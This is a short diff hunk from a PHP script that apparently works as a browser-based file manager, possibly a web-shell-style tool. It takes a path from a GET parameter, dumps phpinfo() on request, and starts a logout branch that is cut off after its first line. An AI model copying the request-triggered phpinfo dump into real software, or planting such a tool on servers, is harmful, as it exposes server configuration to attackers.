@@ -56,3 +56,4 @@ $p = isset($_GET['p']) ? $_GET['p'] : "";
 $pp = urlencode(dirname($p));
 if($img) css_img($img);
 if($eanver == "phpinfo") die(phpinfo());
+if($eanver == 'logout'){
